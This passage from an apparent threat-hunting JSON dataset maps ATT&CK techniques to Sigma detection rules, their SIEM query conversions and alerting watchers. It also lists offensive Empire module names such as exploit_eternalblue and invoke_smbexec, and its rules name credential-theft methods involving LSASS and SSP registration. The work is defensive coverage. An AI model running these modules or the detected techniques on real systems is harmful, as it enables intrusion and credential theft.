\"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4719\" AND AuditPolicyChanges:\"removed\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4719\" AuditPolicyChanges=\"removed\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4719\" AuditPolicyChanges=\"removed\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4719)(?=.*removed))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "Yml\ntitle: Stop Windows Defense Service\ndescription: win7 simulation test results\nstatus: experimental\nauthor: 12306Bro\nlogsource:\nproduct: windows\nservice: system\ndetection:\nselection:\nEventID: 7036\nMessage: 'Windows Firewall service is stopped. '\ncondition: selection\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "Yml\ntitle: windows log Clear\ndescription: win7 and windows server 2003 simulation test results\nstatus: experimental\nauthor: 12306Bro\nlogsource:\nproduct: windows\nservice: security\ndetection:\nselection:\nEventID:\n\\ --1102\n\\ --517\ncondition: selection\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "Yml\ntitle: windows log Clear\ndescription: win7 simulation test results\nstatus: experimental\nauthor: 12306Bro\nlogsource:\nproduct: windows\nservice: system\ndetection:\nselection:\nEventID: 104\ncondition: selection\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_smbexec", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_smbexec", "name": "Empire Module Command"}], "command_list": ["powershell/lateral_movement/invoke_smbexec", "powershell/lateral_movement/invoke_smbexec"], "technique_id": "T1187", "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1187", "Empire Module": "powershell/lateral_movement/invoke_smbexec", "Technique": "Forced Authentication", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/invoke_smbexec\":  [\"T1187\"],"}}], "queries": [{"query": "Sysmon| where EventID == 11and (file_name contains \".lnk\"or file_name contains \".scf\")", "product": "Azure Sentinel", "name": "Forced Authentication"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1209", "parsed_datasets": [], "queries": [{"query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and registry_key_path contains \"\\\\System\\\\CurrentControlSet\\\\Services\\\\W32Time\\\\TimeProviders\\\\\"", "product": "Azure Sentinel", "name": "Time Providers"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1006", "parsed_datasets": [], "queries": [{"query": "title: Raw disk access using illegitimate tools\nid: db809f10-56ce-4420-8c86-d6a7d793c79c\ndescription: Raw disk access using illegitimate tools, possible defence evasion\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.defense_evasion\n    - attack.t1006\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 9\n    filter_1:\n        Device|contains: floppy\n    filter_2:\n      - Image|endswith:             # easy to bypass. requires extra rule to support this one\n            - '\\wmiprvse.exe'\n            - '\\sdiagnhost.exe'\n            - '\\searchindexer.exe'\n            - '\\csrss.exe'\n            - '\\defrag.exe'\n            - '\\smss.exe'\n            - '\\vssvc.exe'\n            - '\\compattelrunner.exe'\n            - '\\wininit.exe'\n            - '\\autochk.exe'\n            - '\\taskhost.exe'\n            - '\\dfsrs.exe'\n            - '\\vds.exe'\n            - '\\lsass.exe'\n    condition: selection and not filter_1 and not filter_2\nfalsepositives:\n    - Legitimate Administrator using tool for raw access or ongoing forensic investigation\nlevel: medium\nstatus: experimental", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Raw disk access using illegitimate tools\nid: db809f10-56ce-4420-8c86-d6a7d793c79c\ndescription: Raw disk access using illegitimate tools, possible defence evasion\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\ntags:\n    - attack.defense_evasion\n    - attack.t1006\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 9\n    filter_1:\n        Device|contains: floppy\n    filter_2:\n      - Image|endswith:             # easy to bypass. requires extra rule to support this one\n            - '\\wmiprvse.exe'\n            - '\\sdiagnhost.exe'\n            - '\\searchindexer.exe'\n            - '\\csrss.exe'\n            - '\\defrag.exe'\n            - '\\smss.exe'\n            - '\\vssvc.exe'\n            - '\\compattelrunner.exe'\n            - '\\wininit.exe'\n            - '\\autochk.exe'\n            - '\\taskhost.exe'\n            - '\\dfsrs.exe'\n            - '\\vds.exe'\n            - '\\lsass.exe'\n    condition: selection and not filter_1 and not filter_2\nfalsepositives:\n    - Legitimate Administrator using tool for raw access or ongoing forensic investigation\nlevel: medium\nstatus: experimental", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"9\" AND (NOT (Device.keyword:*floppy*))) AND (NOT (Image.keyword:(*\\\\\\\\wmiprvse.exe OR *\\\\\\\\sdiagnhost.exe OR *\\\\\\\\searchindexer.exe OR *\\\\\\\\csrss.exe OR *\\\\\\\\defrag.exe OR *\\\\\\\\smss.exe OR *\\\\\\\\vssvc.exe OR *\\\\\\\\compattelrunner.exe OR *\\\\\\\\wininit.exe OR *\\\\\\\\autochk.exe OR *\\\\\\\\taskhost.exe OR *\\\\\\\\dfsrs.exe OR *\\\\\\\\vds.exe OR *\\\\\\\\lsass.exe))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Raw-disk-access-using-illegitimate-tools <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Raw disk access using illegitimate tools\",\\n    \"description\": \"Raw disk access using illegitimate tools, possible defence evasion\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1006\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"9\\\\\" AND (NOT (Device.keyword:*floppy*))) AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\wmiprvse.exe OR *\\\\\\\\\\\\\\\\sdiagnhost.exe OR *\\\\\\\\\\\\\\\\searchindexer.exe OR *\\\\\\\\\\\\\\\\csrss.exe OR *\\\\\\\\\\\\\\\\defrag.exe OR *\\\\\\\\\\\\\\\\smss.exe OR *\\\\\\\\\\\\\\\\vssvc.exe OR *\\\\\\\\\\\\\\\\compattelrunner.exe OR *\\\\\\\\\\\\\\\\wininit.exe OR *\\\\\\\\\\\\\\\\autochk.exe OR *\\\\\\\\\\\\\\\\taskhost.exe OR *\\\\\\\\\\\\\\\\dfsrs.exe OR *\\\\\\\\\\\\\\\\vds.exe OR *\\\\\\\\\\\\\\\\lsass.exe))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"9\\\\\" AND (NOT (Device.keyword:*floppy*))) AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\wmiprvse.exe OR *\\\\\\\\\\\\\\\\sdiagnhost.exe OR *\\\\\\\\\\\\\\\\searchindexer.exe OR *\\\\\\\\\\\\\\\\csrss.exe OR *\\\\\\\\\\\\\\\\defrag.exe OR *\\\\\\\\\\\\\\\\smss.exe OR *\\\\\\\\\\\\\\\\vssvc.exe OR *\\\\\\\\\\\\\\\\compattelrunner.exe OR *\\\\\\\\\\\\\\\\wininit.exe OR *\\\\\\\\\\\\\\\\autochk.exe OR *\\\\\\\\\\\\\\\\taskhost.exe OR *\\\\\\\\\\\\\\\\dfsrs.exe OR *\\\\\\\\\\\\\\\\vds.exe OR *\\\\\\\\\\\\\\\\lsass.exe))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Raw disk access using illegitimate tools\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"9\" AND (NOT (Device.keyword:*floppy*))) AND (NOT (Image.keyword:(*\\\\\\\\wmiprvse.exe *\\\\\\\\sdiagnhost.exe *\\\\\\\\searchindexer.exe *\\\\\\\\csrss.exe *\\\\\\\\defrag.exe *\\\\\\\\smss.exe *\\\\\\\\vssvc.exe *\\\\\\\\compattelrunner.exe *\\\\\\\\wininit.exe *\\\\\\\\autochk.exe *\\\\\\\\taskhost.exe *\\\\\\\\dfsrs.exe *\\\\\\\\vds.exe *\\\\\\\\lsass.exe))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"9\" NOT (Device=\"*floppy*\")) NOT ((Image=\"*\\\\\\\\wmiprvse.exe\" OR Image=\"*\\\\\\\\sdiagnhost.exe\" OR Image=\"*\\\\\\\\searchindexer.exe\" OR Image=\"*\\\\\\\\csrss.exe\" OR Image=\"*\\\\\\\\defrag.exe\" OR Image=\"*\\\\\\\\smss.exe\" OR Image=\"*\\\\\\\\vssvc.exe\" OR Image=\"*\\\\\\\\compattelrunner.exe\" OR Image=\"*\\\\\\\\wininit.exe\" OR Image=\"*\\\\\\\\autochk.exe\" OR Image=\"*\\\\\\\\taskhost.exe\" OR Image=\"*\\\\\\\\dfsrs.exe\" OR Image=\"*\\\\\\\\vds.exe\" OR Image=\"*\\\\\\\\lsass.exe\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"9\"  -(Device=\"*floppy*\"))  -(Image IN [\"*\\\\\\\\wmiprvse.exe\", \"*\\\\\\\\sdiagnhost.exe\", \"*\\\\\\\\searchindexer.exe\", \"*\\\\\\\\csrss.exe\", \"*\\\\\\\\defrag.exe\", \"*\\\\\\\\smss.exe\", \"*\\\\\\\\vssvc.exe\", \"*\\\\\\\\compattelrunner.exe\", \"*\\\\\\\\wininit.exe\", \"*\\\\\\\\autochk.exe\", \"*\\\\\\\\taskhost.exe\", \"*\\\\\\\\dfsrs.exe\", \"*\\\\\\\\vds.exe\", \"*\\\\\\\\lsass.exe\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*9)(?=.*(?!.*(?:.*(?=.*.*floppy.*))))))(?=.*(?!.*(?:.*(?:.*(?=.*(?:.*.*\\\\wmiprvse\\\\.exe|.*.*\\\\sdiagnhost\\\\.exe|.*.*\\\\searchindexer\\\\.exe|.*.*\\\\csrss\\\\.exe|.*.*\\\\defrag\\\\.exe|.*.*\\\\smss\\\\.exe|.*.*\\\\vssvc\\\\.exe|.*.*\\\\compattelrunner\\\\.exe|.*.*\\\\wininit\\\\.exe|.*.*\\\\autochk\\\\.exe|.*.*\\\\taskhost\\\\.exe|.*.*\\\\dfsrs\\\\.exe|.*.*\\\\vds\\\\.exe|.*.*\\\\lsass\\\\.exe)))))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1011", "parsed_datasets": [], "queries": [{"query": "title: Security Support Provider (SSP) added to LSA configuration\nid: eeb30123-9fbd-4ee8-aaa0-2e545bbed6dc\nstatus: experimental\ndescription: Detects the addition of a SSP to the registry. Upon a reboot or API call, SSP DLLs gain access to encrypted and plaintext passwords stored in Windows.\nreferences:\n    - https://attack.mitre.org/techniques/T1101/\n    - https://powersploit.readthedocs.io/en/latest/Persistence/Install-SSP/\ntags:\n    - attack.persistence\n    - attack.t1011\nauthor: iwillkeepwatch\ndate: 2019/01/18\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection_registry:\n        EventID: 13\n        TargetObject: \n            - 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Security Packages'\n            - 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages'\n    exclusion_images:\n        - Image: C:\\Windows\\system32\\msiexec.exe\n        - Image: C:\\Windows\\syswow64\\MsiExec.exe\n    condition: selection_registry and not exclusion_images\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Security Support Provider (SSP) added to LSA configuration\nid: eeb30123-9fbd-4ee8-aaa0-2e545bbed6dc\nstatus: experimental\ndescription: Detects the addition of a SSP to the registry. Upon a reboot or API call, SSP DLLs gain access to encrypted and plaintext passwords stored in Windows.\nreferences:\n    - https://attack.mitre.org/techniques/T1101/\n    - https://powersploit.readthedocs.io/en/latest/Persistence/Install-SSP/\ntags:\n    - attack.persistence\n    - attack.t1011\nauthor: iwillkeepwatch\ndate: 2019/01/18\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection_registry:\n        EventID: 13\n        TargetObject: \n            - 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Security Packages'\n            - 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages'\n    exclusion_images:\n        - Image: C:\\Windows\\system32\\msiexec.exe\n        - Image: C:\\Windows\\syswow64\\MsiExec.exe\n    condition: selection_registry and not exclusion_images\nfalsepositives:\n    - Unlikely\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"13\" AND TargetObject:(\"HKLM\\\\\\\\System\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\Security\\\\ Packages\" OR \"HKLM\\\\\\\\System\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\OSConfig\\\\\\\\Security\\\\ Packages\")) AND (NOT (Image:\"C\\\\:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\msiexec.exe\" OR Image:\"C\\\\:\\\\\\\\Windows\\\\\\\\syswow64\\\\\\\\MsiExec.exe\")))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Security-Support-Provider-SSP-added-to-LSA-configuration <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Security Support Provider (SSP) added to LSA configuration\",\\n    \"description\": \"Detects the addition of a SSP to the registry. Upon a reboot or API call, SSP DLLs gain access to encrypted and plaintext passwords stored in Windows.\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.t1011\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"13\\\\\" AND TargetObject:(\\\\\"HKLM\\\\\\\\\\\\\\\\System\\\\\\\\\\\\\\\\CurrentControlSet\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Lsa\\\\\\\\\\\\\\\\Security\\\\\\\\ Packages\\\\\" OR \\\\\"HKLM\\\\\\\\\\\\\\\\System\\\\\\\\\\\\\\\\CurrentControlSet\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Lsa\\\\\\\\\\\\\\\\OSConfig\\\\\\\\\\\\\\\\Security\\\\\\\\ Packages\\\\\")) AND (NOT (Image:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\msiexec.exe\\\\\" OR Image:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\syswow64\\\\\\\\\\\\\\\\MsiExec.exe\\\\\")))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"13\\\\\" AND TargetObject:(\\\\\"HKLM\\\\\\\\\\\\\\\\System\\\\\\\\\\\\\\\\CurrentControlSet\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Lsa\\\\\\\\\\\\\\\\Security\\\\\\\\ Packages\\\\\" OR \\\\\"HKLM\\\\\\\\\\\\\\\\System\\\\\\\\\\\\\\\\CurrentControlSet\\\\\\\\\\\\\\\\Control\\\\\\\\\\\\\\\\Lsa\\\\\\\\\\\\\\\\OSConfig\\\\\\\\\\\\\\\\Security\\\\\\\\ Packages\\\\\")) AND (NOT (Image:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\msiexec.exe\\\\\" OR Image:\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\syswow64\\\\\\\\\\\\\\\\MsiExec.exe\\\\\")))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Security Support Provider (SSP) added to LSA configuration\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"13\" AND TargetObject:(\"HKLM\\\\\\\\System\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\Security Packages\" \"HKLM\\\\\\\\System\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\OSConfig\\\\\\\\Security Packages\")) AND (NOT (Image:\"C\\\\:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\msiexec.exe\" OR Image:\"C\\\\:\\\\\\\\Windows\\\\\\\\syswow64\\\\\\\\MsiExec.exe\")))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"13\" (TargetObject=\"HKLM\\\\\\\\System\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\Security Packages\" OR TargetObject=\"HKLM\\\\\\\\System\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\OSConfig\\\\\\\\Security Packages\")) NOT (Image=\"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\msiexec.exe\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\syswow64\\\\\\\\MsiExec.exe\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"13\" TargetObject IN [\"HKLM\\\\\\\\System\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\Security Packages\", \"HKLM\\\\\\\\System\\\\\\\\CurrentControlSet\\\\\\\\Control\\\\\\\\Lsa\\\\\\\\OSConfig\\\\\\\\Security Packages\"])  -(Image=\"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\msiexec.exe\" OR Image=\"C:\\\\\\\\Windows\\\\\\\\syswow64\\\\\\\\MsiExec.exe\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*13)(?=.*(?:.*HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\Security Packages|.*HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\OSConfig\\\\Security Packages))))(?=.*(?!.*(?:.*(?:.*(?=.*C:\\\\Windows\\\\system32\\\\msiexec\\\\.exe)|.*(?=.*C:\\\\Windows\\\\syswow64\\\\MsiExec\\\\.exe))))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1177", "parsed_datasets": [], "queries": [{"query": "title: DLL Load via LSASS\nid: b3503044-60ce-4bf4-bbcb-e3db98788823\nstatus: experimental\ndescription: Detects a method to load DLL via LSASS process using an undocumented Registry key\nauthor: Florian Roth\ndate: 2019/10/16\nreferences:\n    - https://blog.xpnsec.com/exploring-mimikatz-part-1/\n    - https://twitter.com/SBousseaden/status/1183745981189427200\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID:\n            - 12 \n            - 13\n        TargetObject: \n            - '*\\CurrentControlSet\\Services\\NTDS\\DirectoryServiceExtPt*'\n            - '*\\CurrentControlSet\\Services\\NTDS\\LsaDbExtPt*'\n    condition: selection\ntags:\n    - attack.execution\n    - attack.t1177\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: DLL Load via LSASS\nid: b3503044-60ce-4bf4-bbcb-e3db98788823\nstatus: experimental\ndescription: Detects a method to load DLL via LSASS process using an undocumented Registry key\nauthor: Florian Roth\ndate: 2019/10/16\nreferences:\n    - https://blog.xpnsec.com/exploring-mimikatz-part-1/\n    - https://twitter.com/SBousseaden/status/1183745981189427200\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID:\n            - 12 \n            - 13\n        TargetObject: \n            - '*\\CurrentControlSet\\Services\\NTDS\\DirectoryServiceExtPt*'\n            - '*\\CurrentControlSet\\Services\\NTDS\\LsaDbExtPt*'\n    condition: selection\ntags:\n    - attack.execution\n    - attack.t1177\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:(\"12\" OR \"13\") AND TargetObject.keyword:(*\\\\\\\\CurrentControlSet\\\\\\\\Services\\\\\\\\NTDS\\\\\\\\DirectoryServiceExtPt* OR *\\\\\\\\CurrentControlSet\\\\\\\\Services\\\\\\\\NTDS\\\\\\\\LsaDbExtPt*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/DLL-Load-via-LSASS <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"DLL Load via LSASS\",\\n    \"description\": \"Detects a method to load DLL via LSASS process using an undocumented Registry key\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1177\"\\n    ],\\n    \"query\": \"(EventID:(\\\\\"12\\\\\" OR \\\\\"13\\\\\") AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\CurrentControlSet\\\\\\\\\\\\\\\\Services\\\\\\\\\\\\\\\\NTDS\\\\\\\\\\\\\\\\DirectoryServiceExtPt* OR *\\\\\\\\\\\\\\\\CurrentControlSet\\\\\\\\\\\\\\\\Services\\\\\\\\\\\\\\\\NTDS\\\\\\\\\\\\\\\\LsaDbExtPt*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:(\\\\\"12\\\\\" OR \\\\\"13\\\\\") AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\CurrentControlSet\\\\\\\\\\\\\\\\Services\\\\\\\\\\\\\\\\NTDS\\\\\\\\\\\\\\\\DirectoryServiceExtPt* OR *\\\\\\\\\\\\\\\\CurrentControlSet\\\\\\\\\\\\\\\\Services\\\\\\\\\\\\\\\\NTDS\\\\\\\\\\\\\\\\LsaDbExtPt*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'DLL Load via LSASS\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:(\"12\" \"13\") AND TargetObject.keyword:(*\\\\\\\\CurrentControlSet\\\\\\\\Services\\\\\\\\NTDS\\\\\\\\DirectoryServiceExtPt* *\\\\\\\\CurrentControlSet\\\\\\\\Services\\\\\\\\NTDS\\\\\\\\LsaDbExtPt*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"12\" OR EventID=\"13\") (TargetObject=\"*\\\\\\\\CurrentControlSet\\\\\\\\Services\\\\\\\\NTDS\\\\\\\\DirectoryServiceExtPt*\" OR TargetObject=\"*\\\\\\\\CurrentControlSet\\\\\\\\Services\\\\\\\\NTDS\\\\\\\\LsaDbExtPt*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id IN [\"12\", \"13\"] TargetObject IN [\"*\\\\\\\\CurrentControlSet\\\\\\\\Services\\\\\\\\NTDS\\\\\\\\DirectoryServiceExtPt*\", \"*\\\\\\\\CurrentControlSet\\\\\\\\Services\\\\\\\\NTDS\\\\\\\\LsaDbExtPt*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*12|.*13))(?=.*(?:.*.*\\\\CurrentControlSet\\\\Services\\\\NTDS\\\\DirectoryServiceExtPt.*|.*.*\\\\CurrentControlSet\\\\Services\\\\NTDS\\\\LsaDbExtPt.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exploitation/exploit_jboss", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exploitation/exploit_jboss", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exploitation/exploit_jenkins", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exploitation/exploit_jenkins", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/get_exploitable_system", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/get_exploitable_system", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exploitation/exploit_eternalblue", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/exploitation/exploit_eternalblue", "name": "Empire Module Command"}], "command_list": ["powershell/exploitation/exploit_jboss", "powershell/exploitation/exploit_jboss", "powershell/exploitation/exploit_jenkins", "powershell/exploitation/exploit_jenkins", "powershell/situational_awareness/network/get_exploitable_system", "powershell/situational_awareness/network/get_exploitable_system", "powershell/exploitation/exploit_eternalblue", "powershell/exploitation/exploit_eternalblue"], "technique_id": "T1210", "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1210", "Empire Module": "powershell/exploitation/exploit_jboss", "Technique": "Exploitation of Remote 